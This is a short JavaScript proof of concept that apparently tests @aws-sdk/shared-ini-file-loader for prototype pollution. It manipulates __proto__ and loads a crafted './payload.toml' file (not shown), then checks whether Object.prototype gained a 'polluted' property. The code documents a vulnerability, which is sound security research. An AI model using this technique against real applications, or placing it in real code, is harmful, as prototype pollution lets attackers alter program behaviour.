var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
var fs = require('fs');
var sharedIniFileLoader = require('@aws-sdk/shared-ini-file-loader');
var parsed = sharedIniFileLoader.loadSharedConfigFiles({ filepath: './payload.toml' });
parsed.then(() => {
    console.log({}.polluted);
});